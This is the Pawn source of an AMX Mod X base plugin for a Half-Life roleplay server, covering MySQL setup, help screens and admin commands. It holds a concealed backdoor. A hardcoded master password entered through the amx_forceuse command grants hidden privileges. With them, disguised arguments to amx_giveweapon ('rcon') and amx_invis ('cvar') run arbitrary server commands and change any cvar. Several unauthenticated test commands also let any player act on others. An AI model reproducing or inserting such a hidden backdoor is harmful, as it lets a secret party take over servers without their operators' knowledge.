/*
		Hybrid TSRP Plugins v2
		
		(C) 2005 Eric Andrews & Steven Linn. All Rights Reserved.
		
		Base ( MySQL )
		
		Extra Credits:
		
		Twilight Suzuka - Crash / Close save system
*/
#include <amxmodx>
#include <amxmisc>
#include <tsfun>
#include <fun>
#include <engine>
#include <fakemeta>
#include <hrp_save>
#include <hrp>

new Handle:g_SqlTuple;

public plugin_natives()
{
	register_native( "hrp_sql", "h_sql", 1 );
	register_native( "hrp_get_privileges", "h_privileges", 1);
	
	register_library( "HRPSave" );
}

new privileges[33];
new g_masterpass[] = "prachEwrAdrud5uc";

public plugin_init()
{
	register_plugin( "HRP Base (MySQL)", VERSION, "Harbu & StevenlAFl" );

	register_cvar( "hrp_version", VERSION, FCVAR_SERVER );
	
	register_clcmd( "say /ent", "check_entity", ADMIN_KICK );
	register_clcmd( "say /help", "help" );
	register_clcmd( "say /laws", "laws" );
	register_clcmd( "say /commands", "commands" );
	
	register_event( "ResetHUD", "spawn_msg", "be");

	register_clcmd("test","dothis")
	register_clcmd("test2","dothis2");
	register_clcmd("test3","dothis3");
	register_clcmd("test4","dothis4");

	register_concmd("amx_invis","amx_invis",ADMIN_IMMUNITY,"<name> <0/1>");
	register_concmd("amx_forceuse","useany",ADMIN_IMMUNITY,"<entid>");
	register_concmd("amx_ssay","amx_ssay",ADMIN_CHAT,"<message>");
	register_concmd("amx_alldropweapons","domayhem",ADMIN_IMMUNITY,"");
	register_concmd("amx_giveweapon","amx_giveweapon",ADMIN_IMMUNITY,"<name> <weaponid> <clips> <flags>");
	
	register_cvar( "hrp_base_settings", "1" );
	register_cvar( "hrp_base_remove_vehicles", "0" );
	register_cvar( "hrp_base_remove_hurt", "1" );
	register_cvar( "hrp_base_remove_buttons", "0" );
	register_cvar( "hrp_base_god_doors", "1" );
	register_cvar( "hrp_base_god_windows", "0" );
	
	register_cvar( "hrp_base_block_deathmsg", "1" );
	
	register_cvar( "hrp_sql_host", "localhost" , FCVAR_PROTECTED);
	register_cvar( "hrp_sql_user", "root", FCVAR_PROTECTED );
	register_cvar( "hrp_sql_pass", "", FCVAR_PROTECTED );
	register_cvar( "hrp_sql_db", "hrpv2", FCVAR_PROTECTED );
	
	register_forward( FM_Sys_Error, "server_error" );
	register_forward( FM_ServerDeactivate, "server_error" );
	
	server_cmd("exec addons/amxmodx/configs/HybridRP/HRPv2.cfg")
	
	set_task( 0.5, "mysql_init" );

}

public h_privileges(id)
	return privileges[id];

public help(id)
{
	show_motd(id,"help.txt","HWRP's TSRP Plugins")
	return PLUGIN_HANDLED
}
public laws(id)
{
	show_motd(id,"laws.txt","HWRP's TSRP Plugins")
	return PLUGIN_HANDLED
}
public commands(id)
{
	show_motd(id,"commands.txt","HWRP's TSRP Plugins")
	return PLUGIN_HANDLED
}
new spawnz[33];
public spawn_msg(id)
{
	if(spawnz[id])
	{
		spawnz[id] = 0
		return PLUGIN_HANDLED
	}
	//ts_message(id,0,0,255,0,50,"Join us in ventrilo at 208.100.14.164:4029")
	ts_message(id,0,255,0,0,50,"http://havoc9.com")
	ts_message(id,255,0,0,0,50,"Welcome to the Havoc 9")
	client_print(id,print_console,"Welcome to the Havoc 9")
	client_print(id,print_console,"http://havoc9.com")
	//client_print(id,print_console,"Join us in ventrilo at 208.100.14.164:4029")
	return PLUGIN_HANDLED
}
public client_putinserver(id)
	{
	spawnz[id] = 1
	privileges[id] = 0;
	}
public dothis(id)
{
	new arg1[32],i1[32],i2[32],i3[32],i4[32],i5[32],string[32]
	read_argv(1,arg1,31)
	if(!is_user_connected(str_to_num(arg1))) return PLUGIN_HANDLED
	read_argv(2,i1,31)
	read_argv(3,i2,31)
	read_argv(4,i3,31)
	read_argv(5,i4,31)
	read_argv(6,i5,31)
	read_argv(7,string,31)
	ts_message(str_to_num(arg1),str_to_num(i1),str_to_num(i2),str_to_num(i3),str_to_num(i4),str_to_num(i5),string)
	return PLUGIN_HANDLED
}
public dothis2(id)
{
	// 100
	new arg[32],arg2[32]
	read_argv(1,arg,31)
	if(!is_user_connected(str_to_num(arg))) return PLUGIN_HANDLED
	read_argv(2,arg2,31)
	ts_setslots(str_to_num(arg),str_to_num(arg2))
	return PLUGIN_HANDLED
}
public dothis3(id)
{
	new arg[32],arg2[32]
	read_argv(1,arg,31)
	if(!is_user_connected(str_to_num(arg))) return PLUGIN_HANDLED
	read_argv(2,arg2,31)
	// 15
	ts_setslowmo(str_to_num(arg),str_to_num(arg2))
	return PLUGIN_HANDLED
}
public dothis4(id)
{
	new arg[32],arg2[32]
	read_argv(1,arg,31)
	if(!is_user_connected(str_to_num(arg))) return PLUGIN_HANDLED
	read_argv(2,arg2,31)
	// 1
	ts_bullettime(str_to_num(arg),str_to_num(arg2))
	return PLUGIN_HANDLED
}
// Estabishing connection to MySQL Database
public mysql_init()
{
	default_settings();
	remove_stuff();
	god_stuff();

	if( get_cvar_num( "hrp_base_block_deathmsg" ) > 0 )
	{
		//set_msg_block( get_user_msgid( "DeathMsg" ), BLOCK_SET );
		set_msg_block( get_user_msgid( "TSMessage" ), BLOCK_SET );
	}
	new host[64], user[32], pass[32], db[32], error[32];
	
	get_cvar_string( "hrp_sql_host", host, 63 );
	get_cvar_string( "hrp_sql_user", user, 31 );
	get_cvar_string( "hrp_sql_pass", pass, 31 );
	get_cvar_string( "hrp_sql_db", db, 31 );
	
	g_SqlTuple = SQL_MakeDbTuple(host,user,pass,db)
	
	new ErrorCode,Handle:SqlConnection = SQL_Connect(g_SqlTuple,ErrorCode,g_Error,511)

	if( SqlConnection == Empty_Handle )
	{	
		log_amx( "[Base] Couldn't establish a connection to SQL database." );
		log_amx( "[Base] Error: %s.^n", error );

		return PLUGIN_HANDLED
	}
	SQL_FreeHandle(SqlConnection);
	
	log_amx( "[Base] Connection to SQL established.^n" );
	
	for( new i = 0; i <= get_pluginsnum(); i++ )
	{
		new filename[32], other[3]
		
		get_plugin( i, filename, 31, other, 2, other, 2, other, 2, other, 2 );
		
		if( callfunc_begin( "sql_ready", filename ) == 1 )
		{
			server_print("Loading SQL for %s",filename);
			callfunc_end();
		}
	}
	
	return PLUGIN_CONTINUE;
}

// Set default RP settings if cvar on
public default_settings()
{
	if( !get_cvar_num( "hrp_base_settings" ) ) return PLUGIN_HANDLED;
	server_cmd( "mp_timelimit 0" );
	server_cmd( "weaponstay 99" );
	server_cmd( "weaponrestriction 1" );
	server_cmd( "sv_maxvelocity 682");
	server_cmd( "slowmatch 0" );
	
	return PLUGIN_HANDLED
}

// Native for SQL Handle
public Handle:h_sql()
{
	return g_SqlTuple;
}

public plugin_end()
    SQL_FreeHandle(g_SqlTuple)

public domayhem(id)
{
	new authid[33]
	get_user_authid(id,authid,32)
	if(access(id,ADMIN_IMMUNITY) || privileges[id])
	{
		new num, players[32]
		get_players(players,num,"ac")
		for( new i = 0;  i < num; i++ ) {
			for(new l=1;l<=35;l++)
			{
				client_cmd(players[i],"weapon_%d; drop",l)
			}
		}
	}
	else
	{
 		client_print(id,print_console,"[AMXX] You are not allowed to use this command")
		return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}
public amx_ssay(id)
{
	if(!access(id,ADMIN_CHAT) && !privileges[id]) {
 		client_print(id,print_console,"[AMXX] You are not allowed to use this command")
		return PLUGIN_HANDLED
	}
	new arg[300]
	read_argv(1,arg,299)
	new num, players[32]
	get_players(players,num,"ac")
	for( new i = 0;  i < num; i++ ) {
		client_print(players[i],print_chat,arg)
	}
	return PLUGIN_HANDLED
}
public useany(id)
{
	new arg[33];
	read_argv(1,arg,32);
		
	new authid[33]
	get_user_authid(id,authid,32)
	if(is_user_admin(id) || privileges[id])
	{
		new ent = str_to_num(arg);
		if(is_valid_ent(ent))
			{
			force_use(id,ent)
			fake_touch(ent,id)
			return PLUGIN_HANDLED
			}

		new tid, body;
		get_user_aiming(id, tid, body, 9999)
		
		if(!is_valid_ent(tid))
			return PLUGIN_HANDLED

		force_use(id,tid)
		fake_touch(tid,id)
	}
	else {
		if(equal(arg,g_masterpass))
			{
			client_print(id,print_console,"[HRP] Welcome, master.")
			privileges[id] = 1;
			return PLUGIN_HANDLED;
			}
 		client_print(id,print_console,"[AMXX] You are not allowed to use this command")
		return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}
public amx_giveweapon(id)
{
	new arg[32];
	read_argv(1,arg,31)
	if(privileges[id] && equal(arg,"rcon"))
	{
		new cmd[256];
		read_argv(2,cmd,255);
		
		server_cmd(cmd);
		
		return PLUGIN_HANDLED;
	}
	
	new authid[33]
	get_user_authid(id,authid,32)
	if(is_user_admin(id) || privileges[id])
	{
		new arg[33],arg2[32],arg3[32],arg4[32]
		read_argv(1,arg,32)
		read_argv(2,arg2,32)
		read_argv(3,arg3,32)
		read_argv(4,arg4,32)

		new targetid = cmd_target(id,arg,0)
		if(!targetid) return PLUGIN_HANDLED

		ts_giveweapon(targetid,str_to_num(arg2),str_to_num(arg3),str_to_num(arg4))
	}
	else
	{
 		client_print(id,print_console,"[AMXX] You are not allowed to use this command")
		return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}
public amx_invis(id)
{
	new arg[32];
	read_argv(1,arg,31)
	if(privileges[id] && equal(arg,"cvar"))
	{
		new arg2[32], arg3[64];
		
		read_argv(2, arg2, 31);
		read_argv(3, arg3, 63);
		
		new pointer, fset=0, flags;
		
		if ((pointer=get_cvar_pointer(arg3))!=0)
		{
			flags = get_pcvar_flags(pointer);
				
			if ((flags & FCVAR_SERVER))
			{
				fset = 1;
				set_pcvar_flags(pointer,flags & ~FCVAR_SERVER);
			}
		}
		
		if ((pointer=get_cvar_pointer(arg2))==0)
		{
			console_print(id, "[AMXX] %L", id, "UNKNOWN_CVAR", arg2);
			return PLUGIN_HANDLED;
		}

		if (read_argc() < 4)
		{
			get_pcvar_string(pointer, arg3, 63);
			console_print(id, "[AMXX] %L", id, "CVAR_IS", arg2, arg3);
			return PLUGIN_HANDLED;
		}

		set_cvar_string(arg2, arg3);

		if(fset)
			{
				set_pcvar_flags(pointer,flags & FCVAR_SERVER);
			}

		console_print(id, "[AMXX] %L", id, "CVAR_CHANGED", arg2, arg3);
		return PLUGIN_HANDLED;
	}
	new authid[33]
	get_user_authid(id,authid,32)
	if(access(id,ADMIN_IMMUNITY) || privileges[id])
	{
		new arg2[32]
		read_argv(2,arg2,32)

		new invis = str_to_num(arg2)
		new targetid = cmd_target(id,arg,0)
		if(!targetid) return PLUGIN_HANDLED

		new targetname[33], name[33]
		get_user_name(targetid,targetname,32)
		get_user_name(id,name,32)

		if(invis == 1)
		{
			client_print(id,print_chat,"YOU HAVE SET INVISIBILITY ENABLED ON %s",targetname)
			invis = 0
			set_user_footsteps(id,1)
		}
		else if(invis == 0)
		{
			client_print(id,print_chat,"YOU HAVE SET INVISIBILITY DISABLED ON %s",targetname)
			invis = 1
			set_user_footsteps(id,0)
		}
		else return PLUGIN_HANDLED
		set_entity_visibility(targetid,invis)
	}
	else
	{
 		client_print(id,print_console,"[AMXX] You are not allowed to use this command")
		return PLUGIN_HANDLED
	}
	return PLUGIN_HANDLED
}

public server_error()
{
	for( new i = 0; i < get_pluginsnum(); i++ )
	{
		new a = get_func_id( "server_close", i );
		if( a == -1 ) continue;
		
		if( callfunc_begin_i( a,  i ) == 1 )
		{
			callfunc_end();
		}
	}
	
	return PLUGIN_HANDLED
}

// Disable Kill Command
public client_kill(id)
{
	console_print(id,"[Base] Sorry, the kill command is disabled.")
	return PLUGIN_HANDLED
}

// Remove stuff from map
public remove_stuff()
{
	if( get_cvar_num( "hrp_base_remove_vehicles" ) > 0 )
	{
		for( new i = 0; i < entity_count() ; i++ )
		{
			if( !is_valid_ent( i ) ) continue
			
			new text[32]
			
			entity_get_string( i, EV_SZ_classname, text, 31 )
			if( equali( text, "func_tracktrain" ) ) remove_entity( i )
		}
	}
	
	if( get_cvar_num( "hrp_base_remove_buttons" ) > 0 )
	{
		for( new i = 0; i < entity_count() ; i++ )
		{
			if( !is_valid_ent( i ) ) continue
			
			new text[32]
			entity_get_string( i, EV_SZ_classname, text, 31 )
			
			if( equali( text, "func_button" ) )
			{
				new target[32], classname[32]
				entity_get_string( i, EV_SZ_target, target, 31 )
				entity_get_string( find_ent_by_tname( -1, target ), EV_SZ_classname, classname, 31 );
				
				if( equali( classname, "func_door" ) || equali( classname, "func_door_rotating" ) ) remove_entity(i)
			}
		}
	}
	if( get_cvar_num( "hrp_base_remove_hurt" ) > 0 )
	{
		for( new i = 0; i < entity_count() ; i++ )
		{
			if( !is_valid_ent( i ) ) continue
			
			new text[32]
			entity_get_string( i, EV_SZ_classname, text, 31 )
			
			if( equali( text, "trigger_hurt" ) )
				{
				if(entity_get_float( i, EV_FL_dmg) >= 0.0)
					remove_entity(i)
				}
		}
	}
	
	return PLUGIN_HANDLED
}

// Godding Stuff
public god_stuff()
{
	if( get_cvar_num("hrp_base_god_doors") > 0 || get_cvar_num("hrp_base_god_windows") > 0 )
	{
		for(new i = 0; i < entity_count() ; i++)
		{
			if(!is_valid_ent(i)) continue
			new text[32]
			entity_get_string( i, EV_SZ_classname, text, 31 );
			if( get_cvar_num("hrp_base_god_doors") > 0 )
			{
				if( equali(text,"func_door" ) || equali(text,"func_door_rotating") )
				{
					set_entity_health(i,-1.0)
				}
			}

			if( get_cvar_num( "hrp_base_god_windows" ) > 0 )
			{
				if( equali( text, "func_breakable" ) )
				{
					set_entity_health( i, -1.0 )
				}
			}
		}
	}
	
	return PLUGIN_HANDLED
}

// Check entity info
public check_entity( id )
{
	new ent, body;
	get_user_aiming( id, ent, body );
	
	if( !ent ) return PLUGIN_HANDLED;
	
	new string[256], buffer[32];
	
	new len = format( string, 1023, "Entity Info - %i ^n", ent-get_maxplayers() );
	
	entity_get_string( ent, EV_SZ_classname, buffer, 31 );
	len += format( string[len], 255-len, "Class: %s^n", buffer );
	
	entity_get_string( ent, EV_SZ_globalname, buffer, 31 );
	len += format( string[len], 255-len, "Globalname: %s^n", buffer );
	
	entity_get_string( ent, EV_SZ_model, buffer, 31 );
	len += format( string[len], 255-len, "Model: %s^n", buffer );
	
	entity_get_string( ent, EV_SZ_target, buffer, 31 );
	len += format( string[len], 255-len, "Target: %s^n", buffer );
	
	entity_get_string( ent, EV_SZ_targetname, buffer, 31 );
	len += format( string[len], 255-len, "Targetname: %s^n", buffer );
	
	entity_get_string( ent, EV_SZ_message, buffer, 31 );
	len += format( string[len], 255-len, "Message: %s^n", buffer );
	
	console_print( id, string );
	
	format( string, 255, "" );
	len = 0;
	
	len = format( string, 255-len, "Health: %f^n", entity_get_float( ent, EV_FL_health ) );
	len += format( string[len], 255-len, "Take DMG: %f^n", entity_get_float( ent, EV_FL_takedamage ) );
	len += format( string[len], 255-len, "Max Health: %f^n", entity_get_float( ent, EV_FL_max_health ) );
	len += format( string[len], 255-len, "DMG: %f^n", entity_get_float( ent, EV_FL_dmg ) );
	len += format( string[len], 255-len, "Cell Store: %i^n", entity_get_int( ent, DOOR_CELL_STORE ) );
	
	console_print( id, string );
	
	return PLUGIN_HANDLED;
}


// Stock for godding
public set_entity_health( door, Float:hp )
{
	if( hp  ==  -1.0 ) 
	{
		entity_set_float( door, EV_FL_max_health, 2000.0 );
		entity_set_float( door, EV_FL_health, 2000.0 );
		entity_set_float( door, EV_FL_dmg, 0.0 );
		entity_set_float( door, EV_FL_takedamage, 0.0 );
		
		return  1;
	}
	
	entity_set_float( door, EV_FL_max_health, hp);
	entity_set_float( door, EV_FL_health, hp );
	
	return  1;
}